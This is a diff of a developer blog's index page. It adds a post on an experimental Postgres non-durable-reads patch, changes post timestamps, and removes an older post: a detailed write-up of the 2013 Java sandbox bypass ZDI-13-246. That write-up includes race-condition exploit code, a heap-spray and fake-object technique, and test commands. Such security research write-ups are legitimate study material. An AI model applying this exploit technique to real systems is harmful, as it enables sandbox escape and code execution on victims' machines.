@@ -9,9 +9,8 @@
   <meta name="author" content="Ben Murphy">
 
   
-  <meta name="description" content="Since the last post on fsync and
-non-durable reads we have had a play around with VoltDB too see if our
-speculation with how synchronous command &hellip;">
+  <meta name="description" content="This is an experiment where we try to find out how much faster Postgres will run
+if patch it to support non-durable reads. Postgresql supports a &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -84,6 +83,97 @@ speculation with how synchronous command &hellip;">
       
   <header>
     
+      <h1 class="entry-title"><a href="/blog/2018/07/06/postgresql-non-durable-reads/">Postgresql Non-Durable Reads</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-07-06T14:29:46+10:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This is an experiment where we try to find out how much faster Postgres will run
+if patch it to support non-durable reads. Postgresql supports a number of
+options when commiting but the ones we are interested in at the moment are
+<code>synchronous_commit = on</code> and <code>synchronous_commit = off</code>. When it is set to <code>on</code>
+Postgresql will wait until the WAL is properly synchronized to the disk before
+returning to the client and when it is <code>off</code> it will not wait at all. Also,
+when it is <code>on</code> postgresql will not release any locks or make any tuples visible
+to other transactions until the WAL is synchronized to disk. This means if you
+have heavy write contention on a particular row then all of your connections
+can end up being serialized around fsync().</p>
+
+<p>For example take this query:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>UPDATE counters set counter = counter + 1 where id = 0;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you run this using pg_bench and 128 clients on Macbook Air with
+<code>wal_sync_method = fsync</code> and <code>synchronous_commit = on</code> you will get around
+1283 transaction/s. This is with an fsync cost of about 0.2 ms. If you
+change <code>wal_sync_method = fsync_writethrough</code> this increases the fsync cost
+to about 10ms and the throughput will drop to around 90 transaction/s. If you
+switch <code>synchronous_commit = off</code> this will increase perforamnce and you will
+get around 2611 transaction/s. However, this is kind of unsafe and you might
+lose transactions that you think have been committed if you have a sudden loss
+of power.</p>
+
+<p>Now, we have made a change to postgresql to drop its locks and record the
+transaction as visible and then wait for the WAL log to be synchronised to disk.
+This gives you similar guarantees to <code>synchronous_commit = on</code> and similar
+performance to <code>synchronous_commit = off</code> when there is high contention. When,
+there is low contention it has similar performance to <code>synchronous_commit = on</code>.</p>
+
+<p>After, this change we get 3321 transactions/s which is about 2.5 times better
+performance that <code>synchronous_commit = on</code> and suspiciously even higher
+than <code>synchronous_commit = off</code>. Currently, I don&rsquo;t have an explanation for this
+and it would seem to indicate that there is an implementation error in the
+patch. (Definitely, do no trust this patch with real data this is currently just
+an experiment.) I would expect that this new mode would perform strictly worse
+than <code>synchronous_commit = off</code>.</p>
+
+<p>It also important to note that using this setting
+<code>sychronous_commit = local_non_durable_reads</code> will produce read anomalies that
+can be similar to the write anomalies you get with <code>sychronous_commit = off</code>.
+For example if you insert an tuple and it fails with a unique check then you
+later try to read that tuple then it is possible it won&rsquo;t be there anymore
+because the original write was not durable when the read was performed for the
+unique check. But for this counter example it is 100% safe as long as you never
+try to read the value of the counter :)</p>
+
+<p>If there is any interest in this I might try to upstream the patch into PG. I&rsquo;m
+just not sure if there are people running with high enough contention and high
+enough fsync times to make this setting useful.</p>
+
+<p><a href="https://github.com/postgres/postgres/compare/master...benmmurphy:non_durable_reads">NonDurableReadPatch</a>
+<a href="https://gist.github.com/benmmurphy/49e83da3f8b0793627e4a02e0d154c82">Benchmarks</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
       <h1 class="entry-title"><a href="/blog/2018/06/07/voltdb-command-logging-quirks/">VoltDB Command Logging Quirks</a></h1>
     
     
@@ -100,7 +190,7 @@ speculation with how synchronous command &hellip;">
   
 
 
-<time datetime="2018-06-07T10:32:09+01:00" pubdate data-updated="true"></time>
+<time datetime="2018-06-07T19:32:09+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -149,7 +239,7 @@ always cause the command log to be synchronised.</p>
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2018/06/01/fsync-db-lock-contention/">FSync DB Lock Contention</a></h1>
+      <h1 class="entry-title"><a href="/blog/2018/06/02/fsync-db-lock-contention/">FSync DB Lock Contention</a></h1>
     
     
       <p class="meta">
@@ -165,7 +255,7 @@ always cause the command log to be synchronised.</p>
   
 
 
-<time datetime="2018-06-01T19:46:30+01:00" pubdate data-updated="true"></time>
+<time datetime="2018-06-02T04:46:30+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -330,7 +420,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2017/08/08/mechanically-solving-avalon/">Mechanically Solving Avalon</a></h1>
+      <h1 class="entry-title"><a href="/blog/2017/08/09/mechanically-solving-avalon/">Mechanically Solving Avalon</a></h1>
     
     
       <p class="meta">
@@ -346,7 +436,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
   
 
 
-<time datetime="2017-08-08T21:48:48+01:00" pubdate data-updated="true"></time>
+<time datetime="2017-08-09T06:48:48+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -396,7 +486,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a></h1>
+      <h1 class="entry-title"><a href="/blog/2017/08/09/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a></h1>
     
     
       <p class="meta">
@@ -412,7 +502,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
   
 
 
-<time datetime="2017-08-08T21:41:33+01:00" pubdate data-updated="true"></time>
+<time datetime="2017-08-09T06:41:33+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -456,7 +546,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
   
 
 
-<time datetime="2017-03-07T09:55:03+00:00" pubdate data-updated="true"></time>
+<time datetime="2017-03-07T19:55:03+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -500,7 +590,7 @@ has I have a LD_PRELOAD library that will add 10s to every fsync.
   
 
 
-<time datetime="2017-01-31T09:00:00+00:00" pubdate data-updated="true"></time>
+<time datetime="2017-01-31T19:00:00+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -682,7 +772,7 @@ parent bash process because we have a subset of permissions.</p>
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2017/01/06/arbitrary-kernel-memory-reads-on-illumos/">Arbitrary Kernel Memory Reads on Illumos</a></h1>
+      <h1 class="entry-title"><a href="/blog/2017/01/07/arbitrary-kernel-memory-reads-on-illumos/">Arbitrary Kernel Memory Reads on Illumos</a></h1>
     
     
       <p class="meta">
@@ -698,7 +788,7 @@ parent bash process because we have a subset of permissions.</p>
   
 
 
-<time datetime="2017-01-06T21:02:05+00:00" pubdate data-updated="true"></time>
+<time datetime="2017-01-07T07:02:05+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -1058,7 +1148,7 @@ all the other bytes having an unknown result (647).</p>
   
 
 
-<time datetime="2016-07-11T09:00:00+01:00" pubdate data-updated="true"></time>
+<time datetime="2016-07-11T18:00:00+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -1137,7 +1227,7 @@ all the other bytes having an unknown result (647).</p>
   
 
 
-<time datetime="2015-11-09T10:41:00+00:00" pubdate data-updated="true"></time>
+<time datetime="2015-11-09T10:41:00+10:00" pubdate data-updated="true"></time>
         
       </p>
     
@@ -1339,444 +1429,6 @@ class loader.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream/">ZDI-13-246 (2013) Java 1.7.0_15 Sandbox Bypass via ObjectOutputStream</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2015-10-23T17:35:00+01:00" pubdate data-updated="true"></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
-between 2012-2013. You can view the other bugs by going back to the <a href="/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">original post</a>.</p>
-
-<p>This is my favourite bug because it takes two read primitives (no memory corruption) and converts them into a full sandbox bypass. The primitives are read some memory as an integer and read some memory as an object reference. This lets us find out the address of a Class object and ultimately build up a fake object that we can read.</p>
-
-<p>It also shows how difficult it is to protect the JVM against hostile code because hostile code is able to create arbitrary threads and generate data races. This particular data race would probably be between 1 or 2 instructions if the JIT was active so it shows that any data race no matter how narrow should be exploitable on the JVM. This is made easier by the fact that as an attacker you can control a lot of the JVM options. For example you can force the JVM to run in interpreted mode which gives you a larger instruction window to race against. Also, you can tweak the GC options and have a lot of control over the heap size which helps with reliability of the heap spray used in this exploit.</p>
-
-<p>We also see that a helpful maintainer has left a comment pointing out the vulnerability :)</p>
-
-<p>This is a full sandbox bypass for Java 6 and Java 7. I&rsquo;ve tested it on
-Java 1.7.0_15 and Java 1.6.0_38 on a single core 64 bit machine. The
-exploit will only work against 64 bit compressed oops memory architecture and
-32 bit memory architecture. It will not work against normal 64 bit architecture.
-By default java after 1.6.0_23 will use compressed oops on a 64 bit machine.</p>
-
-<h2>Vulnerability</h2>
-
-<p>This exploits a data race between reading the current serialized object and
-the description for the current serialized object in the ObjectOutputStream
-class. When in a writeObject method an attacker can call writeObject on the
-ObjectOutputStream on a different thread which will change the current
-serialized context. It is possible for the following order to happen:</p>
-
-<pre><code>/* Thread 1: gets old object */
-defaultWriteObject (435): curObj = curContext.getObj();
-
-/* Thread 2: writes new object and object description */
-writeSerialData (1478):  curContext = new SerialCallbackContext(obj, slotDesc);
-
-/* Thread 1: gets new object description -oh noes- */
-defaultWriteObject (436): curDesc = curContext.getDesc();
-</code></pre>
-
-<p>You have to run the particular call pattern thousands and thousands of times
-to get lucky enough for this to happen. But it can happen :)</p>
-
-<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteObject%28%29">defaultWriteObject</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">431</span>     <span class="kd">public</span> <span class="kt">void</span> <span class="n">defaultWriteObject</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">432</span>         <span class="k">if</span> <span class="o">(</span> <span class="n">curContext</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">)</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">433</span>             <span class="k">throw</span> <span class="k">new</span> <span class="n">NotActiveException</span><span class="o">(</span><span class="s">&quot;not in call to writeObject&quot;</span><span class="o">);</span>
-</span><span class='line'><span class="mi">434</span>         <span class="o">}</span>
-</span><span class='line'><span class="mi">435</span>         <span class="n">Object</span> <span class="n">curObj</span> <span class="o">=</span> <span class="n">curContext</span><span class="o">.</span><span class="na">getObj</span><span class="o">();</span>
-</span><span class='line'><span class="mi">436</span>         <span class="n">ObjectStreamClass</span> <span class="n">curDesc</span> <span class="o">=</span> <span class="n">curContext</span><span class="o">.</span><span class="na">getDesc</span><span class="o">();</span>
-</span><span class='line'><span class="mi">437</span>         <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
-</span><span class='line'><span class="mi">438</span>         <span class="n">defaultWriteFields</span><span class="o">(</span><span class="n">curObj</span><span class="o">,</span> <span class="n">curDesc</span><span class="o">);</span>
-</span><span class='line'><span class="mi">439</span>         <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-</span><span class='line'><span class="mi">440</span>     <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteFields%28java.lang.Object%2Cjava.io.ObjectStreamClass%29">defaultWriteFields</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1503</span>    <span class="kd">private</span> <span class="kt">void</span> <span class="n">defaultWriteFields</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span>
-</span><span class='line'><span class="mi">1504</span>        <span class="kd">throws</span> <span class="n">IOException</span>
-</span><span class='line'><span class="mi">1505</span>    <span class="o">{</span>
-</span><span class='line'><span class="mi">1506</span>        <span class="c1">// REMIND: perform conservative isInstance check here?</span>
-</span><span class='line'><span class="mi">1507</span>        <span class="n">desc</span><span class="o">.</span><span class="na">checkDefaultSerialize</span><span class="o">();</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.writeSerialData%28java.lang.Object%2Cjava.io.ObjectStreamClass%29">writeSerialData</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1477</span>                <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">1478</span>                    <span class="n">curContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SerialCallbackContext</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">slotDesc</span><span class="o">);</span>
-</span><span class='line'><span class="mi">1479</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-</span><span class='line'><span class="mi">1480</span>                    <span class="n">slotDesc</span><span class="o">.</span><span class="na">invokeWriteObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
-</span><span class='line'><span class="mi">1481</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
-</span><span class='line'><span class="mi">1482</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TC_ENDBLOCKDATA</span><span class="o">);</span>
-</span><span class='line'><span class="mi">1483</span>                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">1484</span>                    <span class="n">curContext</span><span class="o">.</span><span class="na">setUsed</span><span class="o">();</span>
-</span><span class='line'><span class="mi">1485</span>                    <span class="n">curContext</span> <span class="o">=</span> <span class="n">oldContext</span><span class="o">;</span>
-</span><span class='line'><span class="mi">1486</span>                    <span class="k">if</span> <span class="o">(</span><span class="n">extendedDebugInfo</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">1487</span>                        <span class="n">debugInfoStack</span><span class="o">.</span><span class="na">pop</span><span class="o">();</span>
-</span><span class='line'><span class="mi">1488</span>                    <span class="o">}</span>
-</span><span class='line'><span class="mi">1489</span>                <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And in the #defaultWriteFields method we also have a &lsquo;REMIND&rsquo; comment
-asking whether we should do the isInstance check which I believe would fix this
-exploit. In ObjectInputStream there is an isInstance check which prevents a
-similar exploit working for the ObjectInputStream. Which is kind of annoying
-because being able to do arbitrary writes in the JVM is more fun than being able
-to arbitrary reads.</p>
-
-<p>This mismatch between the object and the object descriptor is a problem because
-the ObjectStreamClass uses the Unsafe class to read values from memory. This
-is fine when that descriptor and object match but when they don&rsquo;t match the JVM
-can be tricked into interpreting object references as integer values or integer
-values as object references :)</p>
-
-<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getPrimFieldValues%28java.lang.Object%2Cbyte%5B%5D%29">getPrimFieldValues</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1924</span>                    <span class="k">case</span> <span class="sc">&#39;I&#39;</span><span class="o">:</span>
-</span><span class='line'><span class="mi">1925</span>                        <span class="n">Bits</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="n">buf</span><span class="o">,</span> <span class="n">off</span><span class="o">,</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">key</span><span class="o">));</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getObjFieldValues%28java.lang.Object%2Cjava.lang.Object%5B%5D%29">getObjFieldValues</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">2017</span>                    <span class="n">vals</span><span class="o">[</span><span class="n">offsets</span><span class="o">[</span><span class="n">i</span><span class="o">]]</span> <span class="o">=</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">readKeys</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Exploit</h2>
-
-<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/blob/master/ZDI-13-246/Ser2.java">Github</a></p>
-
-<p>The race condition is triggered by supplying a custom writeObject method for
-the class we want to reinterpet. This method will look something like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">ObjectOutputStream</span> <span class="n">oos</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="kd">final</span> <span class="n">CountDownLatch</span> <span class="n">latch</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CountDownLatch</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">Thread</span> <span class="n">th</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="nd">@Override</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
-</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'>        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="k">new</span> <span class="n">ShadowInt</span><span class="o">(</span><span class="n">latch</span><span class="o">));</span>
-</span><span class='line'>      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>        <span class="c1">// ignore</span>
-</span><span class='line'>      <span class="o">}</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="o">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="o">});</span>
-</span><span class='line'>  <span class="n">th</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
-</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'>    <span class="n">start</span><span class="o">.</span><span class="na">await</span><span class="o">();</span>
-</span><span class='line'>    <span class="n">oos</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
-</span><span class='line'>    <span class="n">latch</span><span class="o">.</span><span class="na">countDown</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span>
-</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'>    <span class="n">th</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>    <span class="c1">// TODO Auto-generated catch block</span>
-</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">}</span>
-</span><span class='line'>  <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We spawn a Thread that will perform a writeObject call with an instance of the
-target class we want the original class to be reinterpreted as.</p>
-
-<p>This class will also implement the writeObject method and will use it wait
-until the origin object has completed its defaultWriteObject() call before
-returning. This ensures the new context will be available for the original
-object. Otherwise, the new context might be removed before the original object
-has a chance to use it. It will look something like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">ObjectOutputStream</span> <span class="n">oos</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'>    <span class="n">latch</span><span class="o">.</span><span class="na">await</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>    <span class="c1">// TODO Auto-generated catch block</span>
-</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-</span><span class='line'>  <span class="o">}</span>
-</span><span class='line'><span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The goal of the exploit is to build up a fake object of type FakeMe which will
-have a field of type EvilClassLoader which will point to a normal ClassLoader.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'>  <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">FakeMe</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="kt">int</span> <span class="n">magic</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xDEADBEEF</span><span class="o">;</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="n">EvilClassLoader</span> <span class="n">o</span><span class="o">;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The JVM memory layout of an object looks something like this:</p>
-
-<pre><code>-----------------------------------------------------------
-| Header 4/8 bytes depending on 32bit/64bit               |
-----------------------------------------------------------|
-| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
------------------------------------------------------------
-| Maybe some padding                                      |
------------------------------------------------------------
-| Field 1                                                 |
------------------------------------------------------------
-| etc..                                                   |
------------------------------------------------------------
-</code></pre>
-
-<p>The first thing we need to do is find the class word. To do this we create
-an EatMe class which doesn&rsquo;t have any fields but using the race condition we
-will try and make it look like the ClassCatcher class which has 40 int fields
-in it. We then spray the heap with a bunch of FakeMe classes. Hopefully, the JVM
-will read off the end of the ClassCatcher class and into the memory of the
-FakeMe class. If it serializes a bit of the FakeMe class then the serialized
-data is going to look like:</p>
-
-<pre><code>[Some Crap] [Class Header] [Class Word] 0xDEADBEEF [Some Crap]
-</code></pre>
-
-<p>We can just search for DEADBEEF in the serialized data and if it is there then
-we have recovered the Class word.</p>
-
-<p>The next thing we need is an address of a ClassLoader object and the address
-of an object that we can point inside of and re-interpret as a FakeMe object.
-For the re-interpeting object I chose an array of int. We store the ClassLoader
-and array of int in the ObjectHolder object and use the race condition to
-reinterpret it as a ShadowInt class. The ShadowInt object&rsquo;s fields are integers
-that allow us to read the address of the fields in the ObjectHolder object.</p>
-
-<p>Now we have the addresses of the array of int and a classloader object we can
-create our fake object.</p>
-
-<p>The JVM memory layout of an array of int looks something like this:</p>
-
-<pre><code>-----------------------------------------------------------
-| Header 4/8 bytes depending on 32bit/64bit               |
-----------------------------------------------------------|
-| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
------------------------------------------------------------
-| Length 4 bytes                                          |
------------------------------------------------------------
-| Int at index 0 (4 bytes)                                |
------------------------------------------------------------
-| Int at index 1 (4 bytes)                                |
------------------------------------------------------------
-| Int at index 2 (4 bytes)                                |
------------------------------------------------------------
-| Int at index 3 (4 bytes)                                |
------------------------------------------------------------
-| etc..                                                   |
------------------------------------------------------------
-</code></pre>
-
-<p>So on 64 bit with compressed pointers we store the object header in the first
-two integers, the class word in the third integer and the reference to the class
-loader in the fourth integer. It will look something like this:</p>
-
-<pre><code>-----------------------------------------------------------
-| Header 4/8 bytes depending on 32bit/64bit               |
-----------------------------------------------------------|
-| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
------------------------------------------------------------
-| Length 4 bytes                                          |
------------------------------------------------------------
-| Object Header Part 1                                    |
------------------------------------------------------------
-| Object Header Part 2                                    |
------------------------------------------------------------
-| FakeMe Class Word                                       |
------------------------------------------------------------
-| Reference to ClassLoader                                |
------------------------------------------------------------
-</code></pre>
-
-<p>The address of this fake object will be 16 bytes following the address of the
-array on 64 bit with compressed pointers. However, when we store this address
-somewhere we need to convert it to a compressed pointer. This is done by using
-an offset of 2 from the address of the array (which is already a compressed
-pointer) instead of 16 because compressed pointers effectively multiply the
-address by 8. Very strangely on Linux and windows compressed oops don&rsquo;t appear
-to be compressed and an offset of 16 instead of 2 needs to be used. I only see
-properly compressed oops under OSX [1].</p>
-
-<p>Finally we use the IntHolder object to store the address of the fake object and
-use the race condition to re-inerpret it as a ShadowObject. The ShadowObject has
-a single object field so the address originally stored as an integer will be
-interpreted as an object reference. The ObjectOutputStream will then try to
-serialize it and FakeMe implements the writeObject method so it will be able to
-use the ClassLoader reference to define an Evil class with AllPermission which
-will disable the JVM sandbox. The source code for the Evil class is in Evil.java</p>
-
-<h2>Testing</h2>
-
-<pre><code>java -Xint -XX:+UseSerialGC -Xms256m -Xmx256m -Xnoclassgc -Djava.security.manager Ser2
-</code></pre>
-
-<p>or
-    appletviewer -J-Xint -J-XX:+UseSerialGC -J-Xms256m -J-Xmx256m -J-Xnoclassgc test.html</p>
-
-<p>command line appletviewer needs -Xint and other parameters because it ignores
-the jvm args applet parameter. firefox and ie both correctly handles the
--Xint and other parameters.</p>
-
